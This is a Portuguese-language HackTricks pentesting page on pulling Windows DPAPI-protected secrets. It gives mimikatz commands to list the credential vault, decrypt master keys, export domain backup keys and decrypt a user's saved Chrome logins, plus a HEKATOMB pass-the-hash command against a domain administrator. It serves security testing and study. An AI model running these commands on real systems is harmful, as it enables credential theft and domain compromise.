# DPAPI - Extraindo Senhas

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

Ao criar esta postagem, o mimikatz estava tendo problemas com todas as ações que interagiam com o DPAPI, portanto, **a maioria dos exemplos e imagens foram retirados de**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## O que é DPAPI

Seu uso principal no sistema operacional Windows é **realizar criptografia simétrica de chaves privadas assimétricas**, usando um segredo do usuário ou do sistema como uma contribuição significativa de entropia.\
**O DPAPI permite que os desenvolvedores criptografem chaves usando uma chave simétrica derivada dos segredos de logon do usuário**, ou no caso de criptografia do sistema, usando os segredos de autenticação do domínio do sistema.

Isso torna muito fácil para o desenvolvedor **salvar dados criptografados** no computador **sem** precisar **se preocupar** em **proteger** a **chave de criptografia**.

### O que o DPAPI protege?

O DPAPI é utilizado para proteger os seguintes dados pessoais:

* Senhas e dados de preenchimento automático de formulários no Internet Explorer, Google \*Chrome
* Senhas de contas de e-mail no Outlook, Windows Mail, Windows Mail, etc.
* Senhas de contas de gerenciador FTP interno
* Senhas de acesso a pastas e recursos compartilhados
* Chaves e senhas de contas de rede sem fio
* Chave de criptografia no Windows CardSpace e Windows Vault
* Senhas de conexão de desktop remoto, .NET Passport
* Chaves privadas para o Sistema de Arquivos Criptografados (EFS), criptografia de correio S-MIME, certificados de outros usuários, SSL/TLS no Serviços de Informações da Internet
* EAP/TLS e 802.1x (autenticação VPN e WiFi)
* Senhas de rede no Gerenciador de Credenciais
* Dados pessoais em qualquer aplicativo protegido programaticamente com a função de API CryptProtectData. Por exemplo, no Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.
* ...

{% hint style="info" %}
Um exemplo de uma maneira bem-sucedida e inteligente de proteger dados usando DPAPI é a implementação do algoritmo de criptografia de senha de preenchimento automático no Internet Explorer. Para criptografar o login e a senha para uma determinada página da web, ele chama a função CryptProtectData, onde no parâmetro de entropia opcional ele especifica o endereço da página da web. Assim, a menos que se saiba a URL original onde a senha foi inserida, ninguém, nem mesmo o próprio Internet Explorer, pode descriptografar esses dados de volta.
{% endhint %}

## List Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Arquivos de Credenciais

Os **arquivos de credenciais protegidos pela senha mestra** podem estar localizados em:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtenha informações de credenciais usando o mimikatz `dpapi::cred`, na resposta você pode encontrar informações interessantes, como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Você pode usar o módulo **mimikatz** `dpapi::cred` com o `/masterkey` apropriado para descriptografar:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Chaves Mestras

As chaves DPAPI usadas para criptografar as chaves RSA do usuário são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde {SID} é o [**Identificador de Segurança**](https://en.wikipedia.org/wiki/Security\_Identifier) **daquele usuário**. **A chave DPAPI é armazenada no mesmo arquivo que a chave mestra que protege as chaves privadas do usuário**. Geralmente, é um dado aleatório de 64 bytes. (Observe que este diretório é protegido, portanto, você não pode listá-lo usando `dir` no cmd, mas pode listá-lo no PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Este é o aspecto que terá um conjunto de Chaves Mestras de um usuário:

![](<../../.gitbook/assets/image (324).png>)

Normalmente, **cada chave mestra é uma chave simétrica criptografada que pode descriptografar outro conteúdo**. Portanto, é interessante **extrair** a **Chave Mestra criptografada** para **descriptografar** posteriormente o **outro conteúdo** criptografado com ela.

### Extrair e descriptografar a chave mestra

Na seção anterior, encontramos o guidMasterKey que parecia ser `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, este arquivo estará dentro:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
Para onde você pode extrair a chave mestra com o mimikatz:
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
A chave mestra do arquivo aparecerá na saída.

Finalmente, você pode usar essa **chave mestra** para **descriptografar** o **arquivo de credenciais**:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### Extrair todas as chaves mestras locais com o Administrador

Se você é um administrador, pode obter as chaves mestras dpapi usando:
```
sekurlsa::dpapi
```
### Extrair todas as chaves mestras de backup com o Domain Admin

Um administrador de domínio pode obter as chaves mestras de backup do dpapi que podem ser usadas para descriptografar as chaves criptografadas:
```
lsadump::backupkeys /system:dc01.offense.local /export
```
Usando a chave de backup recuperada, vamos descriptografar a chave mestra do usuário `spotless`:
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
Agora podemos descriptografar os segredos do Chrome do usuário `spotless` usando sua chave mestra descriptografada:
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
## Criptografando e descriptografando conteúdo

Você pode encontrar um exemplo de como criptografar e descriptografar dados com DPAPI usando mimikatz e C++ em [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
Você pode encontrar um exemplo de como criptografar e descriptografar dados com DPAPI usando C# em [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) é uma porta C# de algumas funcionalidades DPAPI do projeto [Mimikatz](https://github.com/gentilkiwi/mimikatz/) de [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da chave de backup do controlador de domínio através do RPC. O script então resolverá todos os endereços IP dos computadores e realizará um smbclient em todos os computadores para recuperar todos os blobs DPAPI de todos os usuários e descriptografar tudo com a chave de backup do domínio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP, você pode encontrar todas as sub-redes, mesmo que não as conheça!

"Porque os direitos de administrador de domínio não são suficientes. Hackeie todos eles."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos por DPAPI automaticamente.

## Referências

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
